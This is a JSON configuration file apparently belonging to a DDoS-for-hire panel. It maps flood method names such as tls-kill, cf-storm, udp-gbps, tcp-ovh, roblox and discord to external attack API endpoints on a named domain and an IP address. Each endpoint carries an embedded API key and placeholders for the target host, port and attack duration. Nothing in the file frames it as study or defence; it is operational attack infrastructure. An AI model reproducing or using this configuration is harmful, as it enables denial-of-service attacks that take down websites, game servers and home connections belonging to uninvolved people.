{
  "tls-kill": {
    "api": [
      "https://phuongthuy.love/api?key=lucifer2003&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls-kill"
    ]
  },
  "tls-lucifer": {
    "api": [
      "https://phuongthuy.love/api?key=lucifer2003&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls-kill",
      "http://160.191.2.161/api/attack?host=<<$host>>&port=<<$port>>&method=tls&time=<<$time>>"
    ]
  },
  "priv-flood": {
    "api": [
      "https://phuongthuy.love/api?key=lucifer2003&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=priv-flood"
    ]
  },
  "browser": {
    "api": [
      "https://phuongthuy.love/api?key=lucifer2003&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=cf-browser"
    ]
  },
  "cf-storm": {
    "api": [
      "https://phuongthuy.love/api?key=lucifer2003&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=cf-storm"
    ]
  },
  "dns": {
    "api": [
      "https://phuongthuy.love/api?key=lucifer2003&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=dns"
    ]
  },
  "udp-pps": {
    "api": [
      "https://phuongthuy.love/api?key=lucifer2003&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp-pps"
    ]
  },
  "udp-gbps": {
    "api": [
      "https://phuongthuy.love/api?key=lucifer2003&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp-gbps"
    ]
  },
  "udp-mix": {
    "api": [
      "https://phuongthuy.love/api?key=lucifer2003&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp-mix"
    ]
  },
  "tcp-mix": {
    "api": [
      "https://phuongthuy.love/api?key=lucifer2003&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-mix"
    ]
  },
  "tcp-ovh": {
    "api": [
      "https://phuongthuy.love/api?key=lucifer2003&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-ovh"
    ]
  },
  "homeholder": {
    "api": [
      "https://phuongthuy.love/api?key=lucifer2003&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=homeholder"
    ]
  },
  "game": {
    "api": [
      "https://phuongthuy.love/api?key=lucifer2003&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=game"
    ]
  },
  "roblox": {
    "api": [
      "https://phuongthuy.love/api?key=lucifer2003&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=roblox"
    ]
  },
  "discord": {
    "api": [
      "https://phuongthuy.love/api?key=lucifer2003&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=discord"
    ]
  }
}